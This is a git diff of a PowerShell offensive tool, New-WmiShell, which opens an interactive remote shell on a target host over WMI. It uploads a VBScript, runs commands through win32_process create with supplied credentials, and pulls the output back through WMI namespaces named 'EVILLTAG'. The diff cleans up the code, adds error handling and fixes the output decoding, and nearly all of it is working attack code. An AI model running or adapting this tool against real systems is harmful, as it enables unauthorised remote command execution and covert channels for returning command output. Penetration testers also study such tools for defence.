@@ -1,4 +1,4 @@
-﻿function New-WmiShell{
+function New-WmiShell{
 <#
 .SYNOPSIS
 Setup interactive shell on a remote host leveraging the WMI service and a VBScript.
@@ -71,9 +71,9 @@ Author : Jesse "RBOT" Davis
 			$vbsName = [System.IO.Path]::GetRandomFileName() + ".vbs"
 			
 			#Grab some data about the host, validation of WMI accessibility
-			$os = gwmi -ComputerName $name -Credential $creds -Class Win32_OperatingSystem
-			$comp = gwmi -ComputerName $name -Credential $creds -Class Win32_ComputerSystem
-			#$env = gwmi -Credential $creds -Class Win32_Environment -ComputerName $computer
+			$os = Get-WmiObject -ComputerName $name -Credential $creds -Class Win32_OperatingSystem
+			$comp = Get-WmiObject -ComputerName $name -Credential $creds -Class Win32_ComputerSystem
+			#$env = Get-WmiObject -Credential $creds -Class Win32_Environment -ComputerName $computer
 			
 			$props = @{
 				'HostName' = $os.CSName;
@@ -127,8 +127,11 @@ Author : Jesse "RBOT" Davis
 			iwmi -ComputerName $computer.ComputerName -Credential $computer.Credentials -Class win32_process -Name create -ArgumentList $cScript | Out-Null
             
             # Wait for vbScrpit to finish writing output to WMI namespaces
-            $outputReady = [NullString]::Value
-            do{$outputReady = gwmi -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
+            Try { $outputReady = [NullString]::Value }
+			         Catch [System.Management.Automation.RuntimeException]
+			             { $outputReady = "" }
+			    Finally {}
+            do{$outputReady = Get-WmiObject -ComputerName $computer.ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
             until($outputReady)
 
 			Get-WmiShellOutput -UserName $computer.Credentials -ComputerName $computer.ComputerName -Encoding $computer.Encoding
@@ -185,15 +188,14 @@ function Enter-WmiShell{
         }
 
         # Drop into WmiShell prompt
-        $command = [NullString]::Value
-        Clear-Host
-        $a = (Get-Host).UI.RawUI
-        $a.BackgroundColor = "black"
-        Clear-Host
+        Try { $command = [NullString]::Value }
+		     Catch [System.Management.Automation.RuntimeException]
+			     { $command = "" }
+	    Finally {}
 
         do{ 
             # Make a pretty prompt for the user to provide commands at
-            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green -backgroundcolor black 
+            Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green  
             $command = Read-Host
 
             # Execute commands on remote host using cscript.exe and uploaded VBScript
@@ -203,17 +205,18 @@ function Enter-WmiShell{
             if ($command -ne "exit") {
 
                 # Wait for vbScrpit to finish writing output to WMI namespaces
-                $outputReady = [NullString]::Value
-                do{$outputReady = gwmi -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
+                Try { $outputReady = [NullString]::Value }
+			         Catch [System.Management.Automation.RuntimeException]
+			             { $outputReady = "" }
+			    Finally {}
+
+                do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                 until($outputReady)
 
                 # Retrieve cmd output written to WMI namespaces 
                 Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Encoding $Encoding
             }
         }until($command -eq "exit")
-
-        $a.BackgroundColor = "DarkBlue"
-        #Clear-Host
 }
 function Get-WmiShellOutput{
 <#
@@ -266,7 +269,7 @@ Author : Jesse "RBOT" Davis
 	) #End Param
 	
 	$getOutput = @()
-	$getOutput = gwmi -Credential $UserName -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
+	$getOutput = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | Select-Object Name
 	
 	if ([BOOL]$getOutput.Length) {
 		
@@ -280,7 +283,7 @@ Author : Jesse "RBOT" Davis
 			foreach ($line in $sortStrings) {
 	
 				#Replace non-base64 characters
-				$cleanString = $line.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
+				$cleanString = $line.Remove(0, 14) -replace "`"", "+" -replace "Ã", "" -replace "_", "/"
 				
 				#Add necessary base64 padding character
 				if ($cleanString.Length % 3 -eq 0) { $base64Pad = $cleanString }
@@ -299,17 +302,19 @@ Author : Jesse "RBOT" Davis
             #Decode Hex output
 			foreach ($line in $sortStrings) {
 				
-				$cleanString = $line.Reomve(0, 15)
-                $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
+				$cleanString = $line.Remove(0, 15)
+                $hexOutput = $cleanString.Split('_') | % { ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) }
+                $decodeString = ($hexOutput -join "").Remove(0, 8) 
+                $decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)
 			}
-		}
-		
+            Write-Host $decodedOutput
+		}	
 	}
 	else {
         #Decode single line Base64
         if($Encoding -eq "Base64") {
 		    $getStrings = $getOutput.Name
-		    $cleanString = $getStrings.Remove(0, 14) -replace "`“", "+" -replace "Ã", "" -replace "_", "/"
+		    $cleanString = $getStrings.Remove(0, 14) -replace "`"", "+" -replace "Ã", "" -replace "_", "/"
 		    Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
 		    Catch [System.Management.Automation.MethodInvocationException] {
 			    Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
@@ -323,8 +328,10 @@ Author : Jesse "RBOT" Davis
         else {
             $getStrings = $getOutput.Name
             $cleanstring = $getStrings.Remove(0,15)
-            $cleanString.Split(“_“) | foreach { Write-Host -object ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) -NoNewline }
+            $hexOutput = $cleanString.Split('_') | % { ([CHAR][BYTE]([CONVERT]::toint16($_, 16))) }  
+            $decodeString = ($hexOutput -join "").Remove(0,8)
+            $decodedOutput = $decodeString.Remove($decodeString.Length - 8, 8)
         }
-
+        Write-Host $decodedOutput
     }
 }
